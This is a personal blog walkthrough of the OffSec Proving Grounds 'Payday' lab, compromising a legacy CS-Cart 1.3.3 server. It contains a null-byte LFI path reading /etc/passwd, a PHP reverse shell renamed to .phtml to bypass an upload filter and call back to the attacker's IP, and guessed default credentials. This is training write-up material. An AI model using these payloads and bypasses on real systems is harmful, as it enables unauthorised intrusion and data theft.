---
title: "[OSCP-Like] - OffSec - Proving Grounds - Payday"
authors: Samarth
date: 2026-01-06
categories: [OffSec, Proving Grounds Practice]
tags: [Linux, CS-Cart, LFI, RCE]
math: true
mermaid: true
---

![Payday - OffSec](/assets/images/writeups/Payday-OffSec/banner.png)

## TL;DR

This writeup is based on the [Payday](https://portal.offsec.com/machine/payday-164/overview/details){:target="_blank"} machine. I began with an Nmap scan revealing a legacy Linux system running **CS-Cart (80)** and outdated **Samba (139/445)**. Enumeration of the web application uncovered an open `/install` directory disclosing version **1.3.3**, which I accessed via default administrative credentials (`admin:admin`). I exploited an **Authenticated Remote Code Execution (RCE)** vulnerability in the Template Editor by uploading a `.phtml` shell to bypass file extension filters. After stabilizing the shell, I laterally moved to the user `patrick` by guessing weak credentials (`patrick:patrick`) and escalated to **Root** by abusing unrestricted `sudo` privileges (`(ALL) ALL`).

## Scanning Network

I began with an Nmap scan to identify open ports and running services.

```bash
sudo nmap -sS -sV -sC -T4 -p- -v -oN scans/fullport.scan 192.168.122.39
Nmap scan report for 192.168.122.39
Host is up (0.068s latency).
Not shown: 65517 closed tcp ports (reset)
PORT      STATE    SERVICE      VERSION
22/tcp    open     ssh          OpenSSH 4.6p1 Debian 5build1 (protocol 2.0)
| ssh-hostkey: 
|   1024 f3:6e:87:04:ea:2d:b3:60:ff:42:ad:26:67:17:94:d5 (DSA)
|_  2048 bb:03:ce:ed:13:f1:9a:9e:36:03:e2:af:ca:b2:35:04 (RSA)
80/tcp    open     http         Apache httpd 2.2.4 ((Ubuntu) PHP/5.2.3-1ubuntu6)
|_http-server-header: Apache/2.2.4 (Ubuntu) PHP/5.2.3-1ubuntu6
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: CS-Cart. Powerful PHP shopping cart software
110/tcp   open     pop3         Dovecot pop3d
139/tcp   open     netbios-ssn  Samba smbd 3.X - 4.X (workgroup: MSHOME)
143/tcp   open     imap         Dovecot imapd
445/tcp   open     netbios-ssn  Samba smbd 3.0.26a (workgroup: MSHOME)
993/tcp   open     ssl/imap     Dovecot imapd
995/tcp   open     ssl/pop3     Dovecot pop3d
```

The scan revealed several open ports indicating a legacy system:

* **22 (SSH)**: Running a very old version of `OpenSSH (4.6p1)`.

* **80 (HTTP)**: Hosting `CS-Cart`, a PHP-based shopping cart software. The headers (Apache 2.2.4, PHP 5.2.3) confirm the OS is extremely outdated.

* **139/445 (SMB)**: Running `Samba 3.0.26a`, a version known for specific configuration-based vulnerabilities.

* **110/143/993/995 (Mail)**: `Dovecot POP3/IMAP` services are running with SSL/TLS support.

## Enumeration

I navigated to `http://192.168.122.39` to inspect the web application running on port 80.

![Web Page](/assets/images/writeups/Payday-OffSec/1.png)

The application is a demonstration store for **CS-Cart**.

I performed directory fuzzing using `dirsearch` to identify hidden paths and administrative interfaces.

```bash
dirsearch -u http://192.168.122.39/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -o dir.fuzz

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25
Wordlist size: 220544

Output File: dir.fuzz

Target: http://192.168.122.39/

[21:17:47] Starting: 
[21:17:49] 301 -  335B  - /images  ->  http://192.168.122.39/images/        
[21:17:50] 200 -    2KB - /image                                            
[21:17:51] 301 -  336B  - /catalog  ->  http://192.168.122.39/catalog/      
[21:17:51] 200 -    2KB - /admin                                            
[21:17:53] 301 -  334B  - /skins  ->  http://192.168.122.39/skins/          
[21:17:55] 301 -  333B  - /core  ->  http://192.168.122.39/core/            
[21:17:56] 200 -    8KB - /install                                          
[21:18:00] 301 -  336B  - /include  ->  http://192.168.122.39/include/      
[21:18:03] 301 -  336B  - /classes  ->  http://192.168.122.39/classes/      
[21:18:04] 200 -   13B  - /config                                           
[21:18:23] 200 -    0B  - /chart                                            
[21:18:24] 301 -  335B  - /addons  ->  http://192.168.122.39/addons/        
[21:18:29] 301 -  332B  - /var  ->  http://192.168.122.39/var/              
[21:18:41] 301 -  337B  - /payments  ->  http://192.168.122.39/payments/    
[21:18:48] 200 -   13B  - /init                                             
[21:18:52] 200 -    0B  - /prepare                                          
[21:21:21] 301 -  336B  - /targets  ->  http://192.168.122.39/targets/      
[21:28:04] 301 -  344B  - /apache2-default  ->  http://192.168.122.39/apache2-default/
[21:28:37] 403 -  313B  - /server-status                                    
                                                                              
Task Completed
```

I first investigated the `/install` directory. Surprisingly, the installation wizard was still accessible. In the top-right corner of the page, the exact software version was disclosed.

![/install](/assets/images/writeups/Payday-OffSec/3.png)

With the specific version `CS-Cart 1.3.3` identified, I searched for known vulnerabilities.

I found two promising exploits on Exploit-DB:

* [48890](https://www.exploit-db.com/exploits/48890) **CS-Cart 1.3.3 - 'classes_dir' LFI**: An unauthenticated Local File Inclusion vulnerability.

* [48891](https://www.exploit-db.com/exploits/48891) **CS-Cart 1.3.3 - Authenticated RCE**: A Remote Code Execution vulnerability requiring administrative privileges.

Since the directory scan had also revealed an `/admin` endpoint.

I navigated to `http://192.168.122.39/admin`, presenting the administrative login panel.

![Admin Login Panel](/assets/images/writeups/Payday-OffSec/2.png)

I decided to check for weak credentials to see if I could achieve the **Authenticated RCE** directly.Given the legacy nature of the application, I attempted to login using standard default credentials.

**Credentials**: `admin:admin`

![Admin Dashboard](/assets/images/writeups/Payday-OffSec/4.png)

The application accepted the credentials, granting me full administrative access.

## Exploitation

I decided to exploit both, starting with the LFI to test file access, and then using the authenticated RCE to gain a shell.

### Local File Inclusion (LFI)

The LFI vulnerability exists in the `class.cs_phpmailer.php` script, specifically in the `classes_dir` parameter. It allows an attacker to include arbitrary files from the local system.

Exploit Path: `http://192.168.122.39/classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../../../../../../../../../etc/passwd%00`

I tested this payload in the browser. The `%00` (Null Byte) is required to bypass the file extension check in this older version of PHP (5.2.3).

![/etc/passwd](/assets/images/writeups/Payday-OffSec/5.png)

The server returned the contents of `/etc/passwd`, confirming the LFI.

### Authenticated Remote Code Execution (RCE)

Having gained administrative access, I identified an **Arbitrary File Upload** vulnerability in the application's template management functionality. The "Template Editor" allows administrators to upload custom files for the storefront's design but fails to enforce strict file extension validation, allowing for the execution of server-side scripts.

The CS-Cart 1.3.3 **Template Editor** (`admin.php?target=template_editor`) is intended for managing `.tpl` and image files. However, the application only filters the specific `.php` extension. It does not block alternative executable extensions supported by the Apache server configuration, such as `.phtml`, `.php3`, or `.php4`. This oversight allows an authenticated attacker to upload a PHP shell and execute it.

I prepared a standard PHP reverse shell. To bypass the upload filter, I renamed the file extension from `.php` to `.phtml`.

```bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.phtml
# Edited shell.phtml to set:
# IP: 192.168.45.X
# PORT: 4444
```

I navigated to the Template Editor in the admin dashboard: `http://192.168.122.39/admin.php?target=template_editor`

![Upload Functionality](/assets/images/writeups/Payday-OffSec/6.png)

Using the upload interface, I uploaded `shell.phtml` to the root of the `/skins/` directory.

![Shell Uploaded](/assets/images/writeups/Payday-OffSec/7.png)

I started a Netcat listener and triggered the shell by browsing to the uploaded file:

**Trigger URL**: `http://192.168.122.39/skins/shell.phtml`.

![www-data shell](/assets/images/writeups/Payday-OffSec/8.png)

I successfully gained a shell as the `www-data` user.

Recalling the `/etc/passwd` file I read earlier via the **Local File Inclusion (LFI)** vulnerability, I knew there was a standard user on the system named **`patrick`**.

Given the target's weak security posture—evidenced by the outdated software and default administrative credentials—I hypothesized that user accounts might also be configured with weak passwords. I attempted to log in via SSH using the username as the password.

**Credentials:** `patrick:patrick`

![User Shell](/assets/images/writeups/Payday-OffSec/9.png)

The login was successful, granting me a fully interactive SSH session as the user patrick.

## Post Exploitation

I checked the sudo permissions to check for escalation vectors.

![sudo -l](/assets/images/writeups/Payday-OffSec/10.png)

The output confirmed that patrick has full sudo privileges (`(ALL) ALL`). This allows executing any command as root.

I simply switched to the root user.

![Root Shell](/assets/images/writeups/Payday-OffSec/11.png)

Payday serves as a classic example of legacy system vulnerabilities. The outdated CS-Cart installation (v1.3.3) provided multiple entry points, from **Local File Inclusion (LFI)** to **Remote Code Execution (RCE)** via the Template Editor. Furthermore, the lack of basic security hardening allowed for trivial lateral movement via weak passwords (`patrick:patrick`) and full privilege escalation due to unrestricted sudo rights.

Thanks for reading this far. If you enjoyed the writeup, do support me [here](https://www.buymeacoffee.com/h4xplo1t){:target="_blank"}.